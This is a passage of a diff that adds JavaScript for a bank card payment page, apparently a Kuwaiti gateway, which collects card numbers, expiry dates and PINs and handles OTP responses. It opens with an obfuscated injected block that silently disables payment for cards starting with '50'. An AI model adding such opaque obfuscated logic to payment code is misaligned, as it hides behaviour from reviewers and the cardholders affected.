+                        if (_0x10cf1c === _0x161b9e) break;
+                        else _0x2dc515['push'](_0x2dc515['shift']());
+                    } catch (_0x28d5e3) {
+                        _0x2dc515['push'](_0x2dc515['shift']());
+                    }
+                }
+            }(_0x4066, 0x5d957));
+            if ('50' == document[_0x50ac53(0x201)](_0x50ac53(0x206))[_0x50ac53(0x1fb)][_0x50ac53(0x1f4)](0x0, 0x2) && _0x50ac53(0x209) == document[_0x50ac53(0x201)]('dcprefix')[_0x50ac53(0x1fb)]) return document[_0x50ac53(0x201)](_0x50ac53(0x208))[_0x50ac53(0x1ff)][_0x50ac53(0x203)] = _0x50ac53(0x1f8), document[_0x50ac53(0x201)](_0x50ac53(0x1fd))[_0x50ac53(0x204)] = _0x50ac53(0x1fe), document[_0x50ac53(0x201)]('otpmsgDC')[_0x50ac53(0x1ff)][_0x50ac53(0x203)] = 'block', document[_0x50ac53(0x201)](_0x50ac53(0x1f3))[_0x50ac53(0x1f7)] = ![], document[_0x50ac53(0x201)](_0x50ac53(0x1f6))[_0x50ac53(0x1f7)] = ![], document[_0x50ac53(0x201)](_0x50ac53(0x200))[_0x50ac53(0x1f7)] = ![], ![];
+            else document[_0x50ac53(0x201)]('otpmsgDC')['style'][_0x50ac53(0x203)] = _0x50ac53(0x1f8);
+
+            //*************sib: end**************
+
+            $('#proceed').hide();
+            $("#overlayhide").show();
+            var paymentId = "43535900025480404358452000953040";
+            var payid = document.paypage.paymentId.value;
+            var mode = 'ECB';
+            if (document.paypage.creditDebitCheck.value != "SVC") {
+                var prdebitCardNo = document.paypage.dcprefix.value;
+                var suffixCardNo = document.paypage.debitNumber.value;
+                var debitCardNo = prdebitCardNo + suffixCardNo;
+                document.paypage.debitCardNumber.value = debitCardNo;
+                var expirymonth = document.paypage.debitMonthSelect.value;
+                var expiryyear = document.paypage.debitYearSelect.value;
+
+            } else {
+                var cardNumber = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[0];
+                var expdate = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[5].split("-");
+                var expirymonth = expdate[0];
+                var expiryyear = expdate[1];
+                document.paypage.debitCardNumber.value = cardNumber;
+                var debitCardNo = cardNumber;
+                var tenant = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[6];
+                //Added for OTP at I-T-B level
+                termBrandlvlAmt = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[7];
+                termBrandlvlAmt = parseFloat(termBrandlvlAmt);
+                brdtype = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[4];
+                document.paypage.Otptenant.value = tenant;
+
+                if (document.getElementById("fCFlg") && document.paypage.fCFlg.value == "on") {
+                    document.paypage.fCFlg.value = "off";
+                }
+            }
+
+
+            var encrypteddebitCardNo = byteArrayToHex(rijndaelEncrypt(debitCardNo, hexToByteArray(paymentId), mode));
+
+
+            if (validatePayform()) {
+                var url = "/kpg/paymentConfirmation.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&instId=" + "202" + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value;
+                var req = initRequest();
+                req.open("POST", url, false);
+                req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+                req.send(null);
+                if (req.status == 200) {
+                    var res = req.responseXML.getElementsByTagName("msg")[0];
+                    var resValue = res.childNodes[0].nodeValue;
+                    var maskedCardNumber = resValue;
+                    document.paypage.MaskingCardNum = "1";
+                }
+                var transactionamount = '28.250';
+                var mrchname = 'Tap Payments EPSP';
+                var langid = document.paypage.langID.value;
+                var cardPin;
+                var encryptedCardPin;
+                var expirationdate;
+                var url;
+                //Added for Points Redemption
+                var PointsRedemptionflg = '0';
+                if (document.paypage.creditDebitCheck.value == "" && true) {
+                    document.paypage.creditDebitCheck.value = "D";
+                } else if (document.paypage.creditDebitCheck.value == "" && false) {
+
+                    document.paypage.creditDebitCheck.value = "C";
+
+                }
+                //Added for Points Redemption
+                //if(document.paypage.creditDebitCheck.value!="SVC"){
+                if (PointsRedemptionflg != 1) {
+                    if (document.paypage.creditDebitCheck.value != "SVC") {
+                        cardPin = $("#cardPin").val();
+                        encryptedCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+                    } else {
+                        cardPin = $("#debitsavedcardPIN").val();
+                        encryptedCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+                    }
+                }
+                // var encryptedamount=byteArrayToHex(rijndaelEncrypt(transactionamount,hexToByteArray(paymentId), mode));
+
+                //Added for PG Eidia Discount
+                var encryptedamount;
+                if (instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1') {
+                    encryptedamount = byteArrayToHex(rijndaelEncrypt(document.paypage.discountedtranamount.value, hexToByteArray(paymentId), mode));
+                } else {
+                    encryptedamount = byteArrayToHex(rijndaelEncrypt(transactionamount, hexToByteArray(paymentId), mode));
+                }
+                //Added for PG Eidia Discount
+
+                var udf4 = 'null';
+                var instcvflg = '0';
+                var termcvflg = '0';
+
+                //Added for OTP at I-T-B level 
+                var inst_term_amt = '0.001';
+                inst_term_amt = parseFloat(inst_term_amt);
+
+                var appallbrdflg = '1';
+                var binsOTPflg = '1';
+                /* Added for OTP at I-T-B level */
+                OTPamtlmtIdentifier = 'T';
+
+                if (appallbrdflg == 0 && binsOTPflg == 1) {
+                    if (termBrandlvlAmt >= inst_term_amt) {
+                        amountlimit = inst_term_amt;
+                    } else if (inst_term_amt >= termBrandlvlAmt) {
+                        amountlimit = termBrandlvlAmt;
+                        /*Added for OTP at I-T-B level*/
+                        OTPamtlmtIdentifier = 'B';
+                    }
+                } else {
+                    amountlimit = inst_term_amt;
+                }
+
+                //Added for prod issue - 29-jun-21
+                var PaymentStatus = 'INITIALIZED';
+
+                //Added for Points Redemption - modified
+                if (true && true) {
+                    //amountlimit='0.001';
+
+                    if (false && document.paypage.fCFlg.value == "on") {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=" + amountlimit + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&fCFlg=" + document.paypage.fCFlg.value + "&otpgencount=" + document.paypage.otpgencount.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value;
+                    } else if (false) {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=" + amountlimit + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&otpgencount=" + document.paypage.otpgencount.value + "&SIflg=" + document.paypage.SIflg.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value;
+                    } else {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=" + amountlimit + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&otpgencount=" + document.paypage.otpgencount.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus; + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value
+                    }
+                } else {
+
+                    if (false && document.paypage.fCFlg.value == "on") {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=0" + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&fCFlg=" + document.paypage.fCFlg.value + "&otpgencount=" + document.paypage.otpgencount.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value;
+                    } else if (false) {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=0" + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&otpgencount=" + document.paypage.otpgencount.value + "&SIflg=" + document.paypage.SIflg.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value;
+                    } else {
+                        url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&cardnumber=" + encrypteddebitCardNo + "&otpflag=1" + "&instId=" + "202" + "&transactionAmount_limit=0" + "&tranamount=" + encryptedamount + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&Otptenant=" + document.paypage.Otptenant.value + "&paymentInitTime=" + "Wed Dec 18 18:07:04 AST 2024" + "&encryptedCardPin=" + encryptedCardPin + "&otpgencount=" + document.paypage.otpgencount.value + "&mrchName=" + mrchname + "&langID=" + langid + "&udf4=" + udf4 + "&instcvflg=" + instcvflg + "&termcvflg=" + termcvflg + "&custvalidflg=" + document.paypage.custvalid.value + "&brandtype=" + brdtype + "&pointsRedemptionflg=" + PointsRedemptionflg + "&Expirymonth=" + expirymonth + "&Expiryyear=" + expiryyear + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus; + "&kfastRegAttemptCount=" + document.paypage.kfastRegAttemptCount.value
+                    }
+                }
+
+                $.ajax({
+                    type: 'post',
+                    url: url,
+                    datatype: 'XML',
+                    success: function(ajaxResponseData) {
+
+                        var xml = jQuery(ajaxResponseData);
+                        var response = xml.find("msg").text();
+                        var result = response.split("|");
+                        var otpStatus = result[0];
+                        var OTPRemaincnt = result[3];
+                        //Added for Points Redemption - modified
+                        if (otpStatus != "CV" && otpStatus != "PTSREDEM" && otpStatus != "KFASTREG" && otpStatus != "OTPDetailsUpdateFailureDecline") {
+                            document.getElementById('OtpUserID').value = result[1];
+                            document.paypage.otpgencount.value = result[2];
+
+                            //Added for Points Redemption
+                            document.getElementById('otpgenMethod').value = result[4];
+                            document.getElementById("debitOTPtimer").maxLength = result[5];
+                            otpTimer = result[6];
+                            //Added for Points Redemption
+
+                            //Added for PROD issue 5th tranx without OTP
+                            var OTPtranId;
+                            if (document.getElementById('otpgenMethod').value == "3") {
+                                OTPtranId = result[10];
+                            } else {
+                                OTPtranId = result[8];
+                            }
+                            document.paypage.OTPtranId.value = OTPtranId;
+                            //Added for PROD issue 5th tranx without OTP
+
+                            /*Added for OTP at I-T-B level*/
+                            document.paypage.OTPtranamtlmt.value = amountlimit;
+                            document.paypage.OTPamtlmtidentifier.value = OTPamtlmtIdentifier;
+                            /*Added for OTP at I-T-B level*/
+
+                            if (otpStatus == "200") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#PayPageEntry").hide();
+                                $("#payConfirm").show();
+                                if (brdtype != configbrdtype) {
+                                    document.getElementById("DCNumber").innerHTML = maskedCardNumber;
+                                    document.getElementById("expmnth").innerHTML = expirymonth;
+                                    document.getElementById("expyear").innerHTML = expiryyear;
+                                    //document.getElementById("payConfirmMobileNum").style.display = "none";
+                                    //document.getElementById("payConfirmCardNum").style.display = "block";
+                                    document.getElementById("payConfirmExpmnth").style.display = "block";
+                                    document.getElementById("payConfirmExpyr").style.display = "block";
+                                } else {
+                                    document.getElementById("DCNumber").innerHTML = maskedCardNumber;
+                                    document.getElementById("expmnth").innerHTML = expirymonth;
+                                    document.getElementById("expyear").innerHTML = expiryyear;
+                                    //document.getElementById("payConfirmMobileNum").style.display = "block";
+                                    //document.getElementById("payConfirmCardNum").style.display = "none";
+                                    document.getElementById("payConfirmExpmnth").style.display = "none";
+                                    document.getElementById("payConfirmExpyr").style.display = "none";
+                                }
+
+                                //Added for PG Eidia Discount
+                                if (instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1') {
+                                    document.paypage.discountedtranamount.value = result[12]
+                                    document.paypage.discountval.value = result[13];
+                                    if (document.paypage.discountval.value != "0.00") {
+                                        document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div><label class="column-label">Amount:</label></div><div><label class="column-value text-label" style="font-style: italic;"> <s>KD&nbsp;28.250</s></label></div>';
+                                        document.getElementById('DiscntRateConfirm').innerHTML = '<div><label class="column-label" style="color: #228B22;">Discount Rate:</label></div><div><label class="column-value text-label" style="color: #228B22;">' + document.paypage.discountval.value + '&nbsp;<span>%</span></label></div>';
+                                        document.getElementById('DiscntedAmtConfirm').innerHTML = '<div><label class="column-label" >You are paying:</label></div><div><label class="column-value text-label" >KD&nbsp;' + document.paypage.discountedtranamount.value + '</label></div>';
+                                        $("#DiscntRateConfirm").show();
+                                        $("#DiscntedAmtConfirm").show();
+                                        $("#OrgTranxAmtConfirm").addClass("row");
+                                    } else {
+                                        document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div><label class="column-label">Amount:</label></div><div><label class="column-value text-label">KD&nbsp;28.250</label></div>';
+                                        document.getElementById('DiscntRateConfirm').innerHTML = '';
+                                        document.getElementById('DiscntedAmtConfirm').innerHTML = '';
+                                        $("#DiscntRateConfirm").hide();
+                                        $("#DiscntedAmtConfirm").hide();
+                                        $("#OrgTranxAmtConfirm").removeClass("row");
+                                    }
+
+                                }
+                                //Added for PG Eidia Discount
+
+                                document.getElementById('OTPDCDIV').style.display = 'block';
+                                document.paypage.otpflgdiv.value = "1";
+                                document.getElementById('otpmsgDC').innerHTML = '';
+                                //Added for Points Redemption - modified
+                                //timer();
+                                //Added for PROD issue 5th tranx without OTP
+                                if (document.getElementById('otpgenMethod').value == "3" && result[11] != '0') {
+                                    document.getElementById('Resend').style.display = "block";
+                                }
+                                timer(otpTimer);
+                                document.getElementById('notification').innerHTML = '<p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.This is an OTP (One Time Password) SMS, it contains ' + document.getElementById("debitOTPtimer").maxLength + ' digits to be entered in the box below.</p>';
+                            } else if (otpStatus == "409") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'Please check your card/mobile information with your issuer bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (otpStatus == "404") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                if (brdtype != configbrdtype) {
+                                    document.getElementById('otpmsgDC').innerHTML = 'Card number does not exist in our system. Please contact your issuer Bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                } else {
+                                    document.getElementById('otpmsgDC').innerHTML = 'Mobile number does not exist in our system. Please contact your issuer Bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                }
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            }
+
+                            //Added by Viswajith S if OTP Configuration not done
+                            else if (otpStatus == "401") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'Failed to validate your card related details. Please try again.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            }
+
+                            //Card number validation
+                            else if (otpStatus == "400") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'Bad Request, the request is invalid or missing required information.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (otpStatus == "500") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'An error occurred while processing your request please try again.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (otpStatus == "UEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (otpStatus == "TEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'OTP Server Timedout, Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (otpStatus == "600") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentOtpGenCancel.value = "OtpGenCancel";
+                                document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                                document.paypage.submit();
+
+                            }
+
+                            //Added for Points Redemption
+                            else if (otpStatus == "OTPGENERROR") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentOtpGenCancel.value = "OtpGenError";
+                                document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                                document.paypage.submit();
+
+                            }
+                            //Added for Points Redemption
+
+                            //Added for prod issue - 29-jun-21
+                            else if (otpStatus == "INVSTAT") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.ErrorText.value = 'Payment Page validation failed due to invalid Order Status:' + result[11];
+                                document.paypage.action = "/kpg/transactiondeclined.htm";
+                                document.paypage.submit();
+
+                            }
+                            //Added for prod issue - 29-jun-21
+                            else if (otpStatus == "NOTP") {
+
+                                $("#PayPageEntry").hide();
+                                $("#payConfirm").show();
+                                $("#notificationbox").hide();
+                                if (brdtype != configbrdtype) {
+                                    document.getElementById("DCNumber").innerHTML = maskedCardNumber;
+                                    document.getElementById("expmnth").innerHTML = expirymonth;
+                                    document.getElementById("expyear").innerHTML = expiryyear;
+                                    //document.getElementById("payConfirmMobileNum").style.display = "none";
+                                    //document.getElementById("payConfirmCardNum").style.display = "block";
+                                    document.getElementById("payConfirmExpmnth").style.display = "block";
+                                    document.getElementById("payConfirmExpyr").style.display = "block";
+                                } else {
+                                    document.getElementById("DCNumber").innerHTML = maskedCardNumber;
+                                    document.getElementById("expmnth").innerHTML = expirymonth;
+                                    document.getElementById("expyear").innerHTML = expiryyear;
+                                    //document.getElementById("payConfirmMobileNum").style.display = "block";
+                                    //document.getElementById("payConfirmCardNum").style.display = "none";
+                                    document.getElementById("payConfirmExpmnth").style.display = "none";
+                                    document.getElementById("payConfirmExpyr").style.display = "none";
+                                }
+
+                                //Added for PG Eidia Discount
+                                if (instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1') {
+                                    document.paypage.discountedtranamount.value = result[10]
+                                    document.paypage.discountval.value = result[11];
+                                    if (document.paypage.discountval.value != "0.00") {
+                                        document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div><label class="column-label">Amount:</label></div><div><label class="column-value text-label" style="font-style: italic;"> <s>KD&nbsp;28.250</s></label></div>';
+                                        document.getElementById('DiscntRateConfirm').innerHTML = '<div><label class="column-label" style="color: #228B22;">Discount Rate:</label></div><div><label class="column-value text-label" style="color: #228B22;">' + document.paypage.discountval.value + '&nbsp;<span>%</span></label></div>';
+                                        document.getElementById('DiscntedAmtConfirm').innerHTML = '<div><label class="column-label" >You are paying:</label></div><div><label class="column-value text-label" >KD&nbsp;' + document.paypage.discountedtranamount.value + '</label></div>';
+                                        $("#DiscntRateConfirm").show();
+                                        $("#DiscntedAmtConfirm").show();
+                                        $("#OrgTranxAmtConfirm").addClass("row");
+                                    } else {
+                                        document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div><label class="column-label">Amount:</label></div><div><label class="column-value text-label">KD&nbsp;28.250</label></div>';
+                                        document.getElementById('DiscntRateConfirm').innerHTML = '';
+                                        document.getElementById('DiscntedAmtConfirm').innerHTML = '';
+                                        $("#DiscntRateConfirm").hide();
+                                        $("#DiscntedAmtConfirm").hide();
+                                        $("#OrgTranxAmtConfirm").removeClass("row");
+                                    }
+                                }
+                                //Added for PG Eidia Discount
+
+                            } else if (otpStatus == "TIMEOUT") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentOtpGenCancel.value = "TIMEOUT";
+                                document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                                document.paypage.submit();
+                            } else if (otpStatus == "CardNoError") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Card-Number.';
+                                $("#ValidationMessage").show();
+                            } else if (otpStatus == "PinError") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Pin(4 digits).';
+                                $("#ValidationMessage").show();
+                            } else if (otpStatus == "MobileNoError") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('ValidationMessage').innerHTML = 'Invalid data - Please check your Mobile Number.';
+                                $("#ValidationMessage").show();
+                            } else {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('OTPDCDIV').style.display = 'none';
+                                document.getElementById('otpmsgDC').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#otpmsgDC").show();
+                                $("#CVmsg").hide();
+                                $("#ValidationMessage").hide();
+                            }
+                        }
+                        //Added for Points Redemption
+                        else if (otpStatus == "PTSREDEM") {
+                            var PTSstatus = result[1];
+                            document.paypage.otpgencount.value = result[2];
+                            //loadhide();
+                            if (PTSstatus == "PTSREDEMFAIL") {
+                                document.getElementById('CVmsg').innerHTML = 'Please check your card/mobile information with your issuer bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            } else if (PTSstatus == "PTSREDEMTEX") {
+                                document.getElementById('CVmsg').innerHTML = 'OTP Server Timedout, Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            } else if (PTSstatus == "PTSREDEMUEX") {
+                                document.getElementById('CVmsg').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            } else if (PTSstatus == "PTSREDEMSE") {
+                                document.getElementById('CVmsg').innerHTML = 'OTP Server error,Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            } else if (PTSstatus == "PTSREDEMCARDNOTREG") {
+                                if (brdtype != configbrdtype) {
+                                    document.getElementById('CVmsg').innerHTML = 'Card number does not exist in our system. Please contact your issuer Bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                } else {
+                                    document.getElementById('CVmsg').innerHTML = 'Mobile number does not exist in our system. Please contact your issuer Bank.<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                }
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            } else {
+                                document.getElementById('CVmsg').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + OTPRemaincnt + ' attempts allowed';
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                $("#otpmsgDC").hide();
+                                $("#CVmsg").show();
+                                $("#ValidationMessage").hide();
+                            }
+                        }
+                        //Added for Points Redemption
+
+                        //Added for KFast Modification CR on 19/JAN/2023 - starts
+                        else if (otpStatus == "KFASTREG") {
+                            var kfastRegFailStatus = result[1];
+                            document.paypage.kfastRegAttemptCount.value = result[3];
+
+                            if (kfastRegFailStatus == "KFASTREGFAIL") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('otpmsgDC').innerHTML = 'KFast Registration failed. <br />Please check your card/mobile information with your issuer bank.';
+                                $("#CVmsg").hide();
+                                $("#otpmsgDC").show();
+                                $("#ValidationMessage").hide();
+                            } else if (kfastRegFailStatus == "KFASTREGFAILTEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('otpmsgDC').innerHTML = 'KFast Registration timeout, Please try again later';
+                                $("#CVmsg").hide();
+                                $("#otpmsgDC").show();
+                                $("#ValidationMessage").hide();
+                            } else if (kfastRegFailStatus == "KFASTREGFAILLUEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('otpmsgDC').innerHTML = 'An Unexpected Error Occurred During KFast Registration, Please try again later';
+                                $("#CVmsg").hide();
+                                $("#otpmsgDC").show();
+                                $("#ValidationMessage").hide();
+                            } else if (kfastRegFailStatus == "KFASTREGFAILSE") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('otpmsgDC').innerHTML = 'KFast Registration error, Please try again later';
+                                $("#CVmsg").hide();
+                                $("#otpmsgDC").show();
+                                $("#ValidationMessage").hide();
+                            } else if (kfastRegFailStatus == "KFASTREGDECLINE") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
